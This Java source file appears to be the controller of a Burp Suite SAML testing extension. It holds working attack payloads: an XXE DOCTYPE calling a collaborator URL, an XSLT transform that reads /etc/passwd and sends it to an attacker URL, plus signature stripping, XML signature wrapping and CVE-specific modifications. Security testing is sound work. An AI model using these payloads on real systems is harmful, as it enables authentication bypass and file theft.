package application;

import application.SamlMessageAnalyzer.SamlMessageAnalysisResult;
import burp.BurpExtender;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.ui.Selection;
import burp.api.montoya.ui.editor.RawEditor;
import burp.api.montoya.ui.editor.extension.ExtensionProvidedHttpRequestEditor;
import gui.CVEHelpWindow;
import gui.SamlMain;
import gui.SamlPanelInfo;
import gui.SignatureHelpWindow;
import gui.XSWHelpWindow;
import helpers.CVE_2022_41912;
import helpers.CVE_2025_23369;
import helpers.CVE_2025_25291;
import helpers.CVE_2025_25292;
import helpers.XMLHelpers;
import helpers.XSWHelpers;
import java.awt.Component;
import java.awt.Desktop;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.spec.InvalidKeySpecException;
import java.util.HashMap;
import java.util.List;
import javax.xml.crypto.MarshalException;
import javax.xml.crypto.dsig.XMLSignatureException;
import javax.xml.parsers.ParserConfigurationException;
import model.BurpCertificate;
import org.w3c.dom.DOMException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import static java.util.Objects.requireNonNull;

public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Observer {

    public static final String XML_CERTIFICATE_NOT_FOUND = "X509 Certificate not found";
    public static final String XSW_ATTACK_APPLIED = "XSW Attack applied";
    public static final String XXE_CONTENT_APPLIED = "XXE content applied";
    public static final String XML_NOT_SUITABLE_FOR_XXE = "This XML Message is not suitable for this particular XXE attack";
    public static final String XSLT_CONTENT_APPLIED = "XSLT content applied";
    public static final String XML_NOT_SUITABLE_FOR_XSLT = "This XML Message is not suitable for this particular XSLT attack";
    public static final String XML_COULD_NOT_SIGN = "Could not sign XML";
    public static final String XML_COULD_NOT_SERIALIZE = "Could not serialize XML";
    public static final String XML_NOT_WELL_FORMED = "XML isn't well formed or binding is not supported.";
    public static final String XML_NOT_SUITABLE_FOR_XSW = "This XML Message is not suitable for this particular XSW, is there a signature?";
    public static final String NO_BROWSER = "Could not open diff in Browser. Path to file was copied to clipboard";
    public static final String NO_DIFF_TEMP_FILE = "Could not create diff temp file.";

    private final CertificateTabController certificateTabController;
    private XMLHelpers xmlHelpers;
    private HttpRequestResponse requestResponse;
    private SamlMessageAnalysisResult samlMessageAnalysisResult;
    private String orgSAMLMessage;
    private String samlMessage;
    private RawEditor textArea;
    private RawEditor textEditorInformation;
    private SamlMain samlGUI;
    private boolean editable;
    private XSWHelpers xswHelpers;
    private boolean isEdited = false;

    public SamlTabController(boolean editable, CertificateTabController certificateTabController) {
        this.certificateTabController = requireNonNull(certificateTabController, "certificateTabController");
        this.editable = editable;
        samlGUI = new SamlMain(this);
        textArea = samlGUI.getTextEditorAction();
        textArea.setEditable(editable);
        textEditorInformation = samlGUI.getTextEditorInformation();
        textEditorInformation.setEditable(false);
        xmlHelpers = new XMLHelpers();
        xswHelpers = new XSWHelpers();
        this.certificateTabController.addObserver(this);
    }

    @Override
    public HttpRequest getRequest() {
        var request = this.requestResponse.request();

        if (isModified()) {
            if (this.samlMessageAnalysisResult.isSOAPMessage()) {
                try {
                    // TODO Only working with getString for both documents,
                    // otherwise namespaces and attributes are emptied -.-
                    var response = this.requestResponse.response();
                    int bodyOffset = response.bodyOffset();
                    var byteMessage = this.requestResponse.response().toByteArray().getBytes();
                    String HTTPHeader = new String(byteMessage, 0, bodyOffset, StandardCharsets.UTF_8);

                    String soapMessage = requestResponse.response().bodyToString();
                    Document soapDocument = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
                    Element soapBody = xmlHelpers.getSOAPBody(soapDocument);
                    xmlHelpers.getString(soapDocument); // Why?
                    Document samlDocumentEdited = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);
                    xmlHelpers.getString(samlDocumentEdited); // Why?
                    Element samlResponse = (Element) samlDocumentEdited.getFirstChild();
                    soapDocument.adoptNode(samlResponse);
                    Element soapFirstChildOfBody = (Element) soapBody.getFirstChild();
                    soapBody.replaceChild(samlResponse, soapFirstChildOfBody);
                    String wholeMessage = HTTPHeader + xmlHelpers.getString(soapDocument);
                    byteMessage = wholeMessage.getBytes(StandardCharsets.UTF_8);
                    request = HttpRequest.httpRequest(ByteArray.byteArray(byteMessage));
                } catch (IOException e) {
                    BurpExtender.api.logging().logToError(e);
                } catch (SAXException e) {
                    setInfoMessageText(XML_NOT_WELL_FORMED);
                }
            } else {
                String textMessage = textArea.getContents().toString();

                String parameterToUpdate;
                if (this.samlMessageAnalysisResult.isWSSMessage()) {
                    parameterToUpdate = "wresult";
                } else if (this.samlMessageAnalysisResult.isSAMLRequest()) {
                    parameterToUpdate = certificateTabController.getSamlRequestParameterName();
                } else {
                    parameterToUpdate = certificateTabController.getSamlResponseParameterName();
                }

                HttpParameterType parameterType;
                if (request.method().equals("GET")) {
                    parameterType = HttpParameterType.URL;
                } else {
                    parameterType = HttpParameterType.BODY;
                }

                HttpParameter newParameter =
                        HttpParameter.parameter(
                                parameterToUpdate,
                                SamlMessageEncoder.getEncodedSAMLMessage(
                                        textMessage,
                                        this.samlMessageAnalysisResult.isWSSMessage(),
                                        this.samlMessageAnalysisResult.isWSSUrlEncoded(),
                                        this.samlMessageAnalysisResult.isInflated(),
                                        this.samlMessageAnalysisResult.isGZip()),
                                parameterType);

                request = request.withUpdatedParameters(newParameter);
            }
        }
        return request;
    }

    @Override
    public Selection selectedData() {
        return textArea.selection().orElse(null);
    }

    @Override
    public String caption() {
        return "SAML Raider";
    }

    @Override
    public Component uiComponent() {
        return samlGUI;
    }

    @Override
    public boolean isEnabledFor(HttpRequestResponse requestResponse) {
        var samlMessageAnalysisResult =
                SamlMessageAnalyzer.analyze(
                        requestResponse.request(),
                        this.certificateTabController.getSamlRequestParameterName(),
                        this.certificateTabController.getSamlResponseParameterName());

        return samlMessageAnalysisResult.isSAMLMessage();
    }


    @Override
    public boolean isModified() {
        return textArea.isModified() || isEdited;
    }

    @Override
    public void setRequestResponse(HttpRequestResponse requestResponse) {
        this.requestResponse = requestResponse;
        resetInfoMessageText();
        isEdited = false;
        if (requestResponse == null) {
            textArea.setContents(null);
            textArea.setEditable(false);
            setGUIEditable(false);
            resetInformationDisplay();
        } else {
            this.samlMessageAnalysisResult =
                    SamlMessageAnalyzer.analyze(
                            requestResponse.request(),
                            this.certificateTabController.getSamlRequestParameterName(),
                            this.certificateTabController.getSamlResponseParameterName());

            try {
                if (this.samlMessageAnalysisResult.isSOAPMessage()) {
                    String soapMessage = requestResponse.response().bodyToString();
                    Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
                    Document documentSAML = xmlHelpers.getSAMLResponseOfSOAP(document);
                    samlMessage = xmlHelpers.getStringOfDocument(documentSAML);
                } else if (this.samlMessageAnalysisResult.isWSSMessage()) {
                    var parameterValue = requestResponse.request().parameterValue("wresult", HttpParameterType.BODY);
                    var decodedSAMLMessage =
                            SamlMessageDecoder.getDecodedSAMLMessage(
                                    parameterValue,
                                    this.samlMessageAnalysisResult.isWSSMessage(),
                                    this.samlMessageAnalysisResult.isWSSUrlEncoded());
                    this.samlMessage = decodedSAMLMessage.message();
                } else {
                    var httpParamType =
                            this.samlMessageAnalysisResult.isURLParam()
                                    ? HttpParameterType.URL
                                    : HttpParameterType.BODY;

                    var parameterValue =
                            this.samlMessageAnalysisResult.isSAMLRequest()
                                    ? requestResponse.request().parameterValue(certificateTabController.getSamlRequestParameterName(), httpParamType)
                                    : requestResponse.request().parameterValue(certificateTabController.getSamlResponseParameterName(), httpParamType);

                    var decodedSAMLMessage =
                            SamlMessageDecoder.getDecodedSAMLMessage(
                                    parameterValue,
                                    this.samlMessageAnalysisResult.isWSSMessage(),
                                    this.samlMessageAnalysisResult.isWSSUrlEncoded());

                    this.samlMessage = decodedSAMLMessage.message();
                }
            } catch (IOException e) {
                BurpExtender.api.logging().logToError(e);
                setInfoMessageText(XML_COULD_NOT_SERIALIZE);
            } catch (SAXException e) {
                BurpExtender.api.logging().logToError(e);
                setInfoMessageText(XML_NOT_WELL_FORMED);
                samlMessage = "<error>" + XML_NOT_WELL_FORMED + "</error>";
            } catch (ParserConfigurationException e) {
                BurpExtender.api.logging().logToError(e);
            }

            setInformationDisplay();
            updateCertificateList();
            updateXSWList();
            orgSAMLMessage = samlMessage;
            textArea.setContents(ByteArray.byteArray(samlMessage));
            textArea.setEditable(editable);

            setGUIEditable(editable);
        }
    }

    private void setInformationDisplay() {
        samlGUI.getTextEditorInformation().setContents(ByteArray.byteArray(""));
        SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
        infoPanel.clearAll();

        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);
            String formattedDocumentWithIndentation = xmlHelpers.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage), 2);
            textEditorInformation.setContents(ByteArray.byteArray(formattedDocumentWithIndentation.getBytes()));
            NodeList assertions = xmlHelpers.getAssertions(document);
            if (assertions.getLength() > 0) {
                Node assertion = assertions.item(0);
                infoPanel.setIssuer(xmlHelpers.getIssuer(document));
                infoPanel.setConditionNotBefore(xmlHelpers.getConditionNotBefore(assertion));
                infoPanel.setConditionNotAfter(xmlHelpers.getConditionNotAfter(assertion));
                infoPanel.setSubjectConfNotBefore(xmlHelpers.getSubjectConfNotBefore(assertion));
                infoPanel.setSubjectConfNotAfter(xmlHelpers.getSubjectConfNotAfter(assertion));
                infoPanel.setSignatureAlgorithm(xmlHelpers.getSignatureAlgorithm(assertion));
                infoPanel.setDigestAlgorithm(xmlHelpers.getDigestAlgorithm(assertion));
            } else {
                assertions = xmlHelpers.getEncryptedAssertions(document);
                Node assertion = assertions.item(0);
                infoPanel.setEncryptionAlgorithm(xmlHelpers.getEncryptionMethod(assertion));
            }
        } catch (SAXException | IOException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        }
    }

    private void resetInformationDisplay() {
        SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
        infoPanel.setIssuer("");
        infoPanel.setConditionNotBefore("");
        infoPanel.setConditionNotAfter("");
        infoPanel.setSubjectConfNotBefore("");
        infoPanel.setSubjectConfNotAfter("");
        infoPanel.setSignatureAlgorithm("");
        infoPanel.setDigestAlgorithm("");
        infoPanel.setEncryptionAlgorithm("");
        textEditorInformation.setContents(ByteArray.byteArray(""));
    }


    public void removeSignature() {
        resetInfoMessageText();
        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getContents().toString());
            if (xmlHelpers.removeAllSignatures(document) > 0) {
                samlMessage = xmlHelpers.getStringOfDocument(document);
                textArea.setContents(ByteArray.byteArray(samlMessage));
                isEdited = true;
                setInfoMessageText("Message signature successful removed");
            } else {
                setInfoMessageText("No Signatures available to remove");
            }
        } catch (SAXException e1) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        }
    }

    public void resetMessage() {
        samlMessage = orgSAMLMessage;
        textArea.setContents(ByteArray.byteArray(samlMessage));
        samlGUI.getStatusPanel().setText("");
        isEdited = false;
    }

    public void resignAssertion() {
        try {
            resetInfoMessageText();
            BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
            if (cert != null) {
                setInfoMessageText("Signing...");
                Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getContents().toString());
                NodeList assertions = xmlHelpers.getAssertions(document);
                String signAlgorithm = xmlHelpers.getSignatureAlgorithm(assertions.item(0));
                String digestAlgorithm = xmlHelpers.getDigestAlgorithm(assertions.item(0));

                xmlHelpers.removeAllSignatures(document);
                String string = xmlHelpers.getString(document);
                Document doc = xmlHelpers.getXMLDocumentOfSAMLMessage(string);
                xmlHelpers.removeEmptyTags(doc);
                xmlHelpers.signAssertion(doc, signAlgorithm, digestAlgorithm, cert.getCertificate(), cert.getPrivateKey());
                samlMessage = xmlHelpers.getStringOfDocument(doc);
                textArea.setContents(ByteArray.byteArray(samlMessage));
                isEdited = true;
                setInfoMessageText("Assertions successfully signed");
            } else {
                setInfoMessageText("no certificate chosen to sign");
            }
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
            BurpExtender.api.logging().logToError(e);
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
            BurpExtender.api.logging().logToError(e);
        } catch (Exception e) {
            setInfoMessageText(XML_COULD_NOT_SIGN);
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void resignMessage() {
        try {
            resetInfoMessageText();
            if (this.samlMessageAnalysisResult.isWSSMessage()) {
                setInfoMessageText("Message signing is not possible with WS-Security messages");
            } else {
                setInfoMessageText("Signing...");
                BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
                if (cert != null) {
                    Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getContents().toString());
                    NodeList responses = xmlHelpers.getResponse(document);
                    String signAlgorithm = xmlHelpers.getSignatureAlgorithm(responses.item(0));
                    String digestAlgorithm = xmlHelpers.getDigestAlgorithm(responses.item(0));

                    xmlHelpers.removeOnlyMessageSignature(document);
                    xmlHelpers.signMessage(document, signAlgorithm, digestAlgorithm, cert.getCertificate(), cert.getPrivateKey());
                    samlMessage = xmlHelpers.getStringOfDocument(document);
                    textArea.setContents(ByteArray.byteArray(samlMessage));
                    isEdited = true;
                    setInfoMessageText("Message successfully signed");
                } else {
                    setInfoMessageText("no certificate chosen to sign");
                }
            }
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
            BurpExtender.api.logging().logToError(e);
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
            BurpExtender.api.logging().logToError(e);
        } catch (CertificateException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN);
            BurpExtender.api.logging().logToError(e);
        } catch (NoSuchAlgorithmException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN + ", no such algorithm");
            BurpExtender.api.logging().logToError(e);
        } catch (InvalidKeySpecException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN + ", invalid private key");
            BurpExtender.api.logging().logToError(e);
        } catch (MarshalException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
            BurpExtender.api.logging().logToError(e);
        } catch (XMLSignatureException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN);
            BurpExtender.api.logging().logToError(e);
        }
    }

    private void setInfoMessageText(String infoMessage) {
        samlGUI.getStatusPanel().setText(infoMessage);
    }

    public String getInfoMessageText() {
        return samlGUI.getStatusPanel().getText();
    }

    private void resetInfoMessageText() {
        samlGUI.getStatusPanel().setText("");
    }

    private void updateCertificateList() {
        List<BurpCertificate> list = certificateTabController.getCertificatesWithPrivateKey();
        samlGUI.getActionPanel().setCertificateList(list);
    }

    private void updateXSWList() {
        samlGUI.getActionPanel().setXSWList(XSWHelpers.xswTypes);
    }

    public void sendToCertificatesTab() {
        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getContents().toString());
            String cert = xmlHelpers.getCertificate(document.getDocumentElement());
            if (cert != null) {
                certificateTabController.importCertificateFromString(cert);
            } else {
                setInfoMessageText(XML_CERTIFICATE_NOT_FOUND);
            }
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        }
    }

    public void showXSWPreview() {
        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
            xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
            String after = xmlHelpers.getStringOfDocument(document);
            String diff = xswHelpers.diffLineMode(orgSAMLMessage, after);

            File file = File.createTempFile("tmp", ".html", null);
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            file.deleteOnExit();
            fileOutputStream.write(diff.getBytes(StandardCharsets.UTF_8));
            fileOutputStream.flush();
            fileOutputStream.close();

            URI uri = file.toURI();

            Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
            if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
                desktop.browse(uri);
            } else {
                StringSelection stringSelection = new StringSelection(uri.toString());
                Clipboard clpbrd = Toolkit.getDefaultToolkit().getSystemClipboard();
                clpbrd.setContents(stringSelection, null);
                setInfoMessageText(NO_BROWSER);
            }

        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (DOMException e) {
            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
        } catch (MalformedURLException e) {
            BurpExtender.api.logging().logToError(e);
        } catch (IOException e) {
            setInfoMessageText(NO_DIFF_TEMP_FILE);
        }
    }

    public void applyCVE() {
        try {
            var cve = samlGUI.getActionPanel().getSelectedCVE();
            switch (cve) {
                case CVE_2022_41912.CVE:
                    samlMessage = CVE_2022_41912.apply(orgSAMLMessage);
                    textArea.setContents(ByteArray.byteArray(samlMessage));
                    isEdited = true;
                    setInfoMessageText("%s applied".formatted(cve));
                    break;
                case CVE_2025_23369.CVE:
                    samlMessage = CVE_2025_23369.apply(orgSAMLMessage);
                    textArea.setContents(ByteArray.byteArray(samlMessage));
                    isEdited = true;
                    setInfoMessageText("%s applied".formatted(cve));
                    break;
                case CVE_2025_25291.CVE:
                    samlMessage = CVE_2025_25291.apply(orgSAMLMessage);
                    textArea.setContents(ByteArray.byteArray(samlMessage));
                    isEdited = true;
                    setInfoMessageText("%s applied".formatted(cve));
                    break;
                case CVE_2025_25292.CVE:
                    samlMessage = CVE_2025_25292.apply(orgSAMLMessage);
                    textArea.setContents(ByteArray.byteArray(samlMessage));
                    isEdited = true;
                    setInfoMessageText("%s applied".formatted(cve));
                    break;
            }
        } catch (Exception exc) {
            setInfoMessageText(exc.getMessage());
            BurpExtender.api.logging().logToError(exc);
        }
    }

    public void applyXSW() {
        Document document;
        try {
            document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
            xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
            samlMessage = xmlHelpers.getStringOfDocument(document);
            textArea.setContents(ByteArray.byteArray(samlMessage));
            isEdited = true;
            setInfoMessageText(XSW_ATTACK_APPLIED);
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        } catch (DOMException | NullPointerException e) {
            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
        }
    }

    public void applyXXE(String collabUrl) {
        String xxePayload = "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe; ]>\n";
        String[] splitMsg = orgSAMLMessage.split("\\?>");
        if (splitMsg.length == 2) {
            samlMessage = splitMsg[0] + "?>" + xxePayload + splitMsg[1];
        } else {
            String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
            samlMessage = xmlDeclaration + xxePayload + orgSAMLMessage;
        }
        textArea.setContents(ByteArray.byteArray(samlMessage));
        isEdited = true;
        setInfoMessageText(XXE_CONTENT_APPLIED);
    }

    public void applyXSLT(String collabUrl) {
        var prefixed = true;
        var transformString = "<ds:Transforms>";

        int index = orgSAMLMessage.indexOf(transformString);
        if (index == -1) {
            prefixed = false;
            transformString = "<Transforms>";
        }

        index = orgSAMLMessage.indexOf(transformString);
        if (index == -1) {
            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSLT);
            return;
        }

        var prefix = prefixed ? "ds:" : "";
        var xslt = """
                
                <%sTransform>
                  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                    <xsl:template match="doc">
                      <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
                      <xsl:variable name="escaped" select="encode-for-uri($file)"/>
                      <xsl:variable name="attackerUrl" select="'%s'"/>
                      <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
                      <xsl:value-of select="unparsed-text($exploitUrl)"/>
                    </xsl:template>
                  </xsl:stylesheet>
                </%sTransform>
                """.formatted(prefix, collabUrl, prefix);

        int substringIndex = index + transformString.length();
        String firstPart = orgSAMLMessage.substring(0, substringIndex);
        String secondPart = orgSAMLMessage.substring(substringIndex);
        samlMessage = firstPart + xslt + secondPart;
        textArea.setContents(ByteArray.byteArray(samlMessage));
        isEdited = true;
        setInfoMessageText(XSLT_CONTENT_APPLIED);
    }

    public synchronized void addMatchAndReplace(String match, String replace) {
        XSWHelpers.MATCH_AND_REPLACE_MAP.put(match, replace);
    }

    public synchronized HashMap<String, String> getMatchAndReplaceMap() {
        return XSWHelpers.MATCH_AND_REPLACE_MAP;
    }

    public void setGUIEditable(boolean editable) {
        if (editable) {
            samlGUI.getActionPanel().enableControls();
        } else {
            samlGUI.getActionPanel().disableControls();
        }
    }

    public void showCVEHelp() {
        var cve = samlGUI.getActionPanel().getSelectedCVE();
        var window = new CVEHelpWindow(cve);
        window.setLocationRelativeTo(BurpExtender.api.userInterface().swingUtils().suiteFrame());
        window.setVisible(true);
    }

    public void showSignatureHelp() {
        var window = new SignatureHelpWindow();
        window.setLocationRelativeTo(BurpExtender.api.userInterface().swingUtils().suiteFrame());
        window.setVisible(true);
    }

    public void showXSWHelp() {
        XSWHelpWindow window = new XSWHelpWindow();
        window.setLocationRelativeTo(BurpExtender.api.userInterface().swingUtils().suiteFrame());
        window.setVisible(true);
    }

    @Override
    public void update() {
        updateCertificateList();
    }

    public String getEditorContents() {
        return this.textArea.getContents().toString();
    }

    public void setEditorContents(String text) {
        this.isEdited = true;
        this.textArea.setContents(ByteArray.byteArray(text));
    }
}
